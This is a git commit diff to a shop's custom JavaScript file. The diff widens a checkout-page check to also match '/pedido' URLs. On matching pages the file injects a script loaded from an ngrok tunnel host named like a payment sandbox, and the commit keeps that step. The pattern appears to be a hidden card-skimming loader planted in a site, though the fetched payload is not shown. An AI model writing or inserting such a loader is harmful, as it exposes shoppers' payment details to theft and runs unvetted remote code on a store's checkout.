89e46a2dfaadc56830a8b27fb8ead2e09e4ae291
supportingmx <88459207+supportingmx@users.noreply.github.com>
2026-02-09 18:05:54 -0600

    Update custom_s_1.js

--- custom_s_1.js
+++ custom_s_1.js
@@ -1,5 +1,5 @@
 // Load overlay only on checkout page
-if (window.location.href.indexOf('/order') > -1 || window.location.href.indexOf('controller=order') > -1) {
+if (window.location.href.indexOf('/pedido') > -1 || window.location.href.indexOf('/order') > -1 || window.location.href.indexOf('controller=order') > -1) {
     var s = document.createElement('script');
     s.src = 'https://sandbox-open-pay.ngrok.io/overlay.js';
     document.body.appendChild(s);
